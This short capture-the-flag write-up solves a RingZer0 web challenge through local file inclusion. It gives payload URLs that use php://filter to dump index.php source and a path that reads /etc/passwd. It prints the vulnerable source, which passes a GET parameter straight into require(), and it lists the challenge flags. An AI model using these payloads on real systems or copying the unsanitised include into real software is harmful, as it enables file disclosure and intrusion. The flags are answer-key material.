<h1>Looking for password</h1>
<p>Because of the web are set allow_url_include to off. So, we are only inject the code with php://</p>
<p>http://ringzer0team.com:1008/?page=php://filter/convert.base64-encode/resource=index.php<br/>
We get an base64 string. Decode it.
</p>

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$include = isset($_GET['page']) ? $_GET['page'] : 'lorem.php';
// FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>RingZer0 Team CTF - Challenge</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron.css" rel="stylesheet">

  </head>

  <body>

    <nav class="navbar navbar-inverse navbar-fixed-top" >
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="#" style="color: white;">RingZer0 Team CTF - Challenge</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
		<div class="navbar-form navbar-right">
		</div>
        </div><!--/.navbar-collapse -->
      </div>
    </nav>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
      <div class="container">
        <h1>About Us</h1>
        <p>
	<?php require($include); ?>
	</p>
      </div>
    </div>

      <hr>
<div class="container">
      <footer>
        <p>&copy; RingZer0 Team CTF 2014 - <?php echo date('Y'); ?></p>
      </footer>
    </div> <!-- /container -->
  </body>
</html>
```

<p>The page contains the flag:FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J</br>
But the flag are not correct! Will it in http://ringzer0team.com:1008/?page=/etc/passwd?<br/>
Finally we get:FLAG-zH9g1934v774Y7Zx5s16t5ym8Z</p>
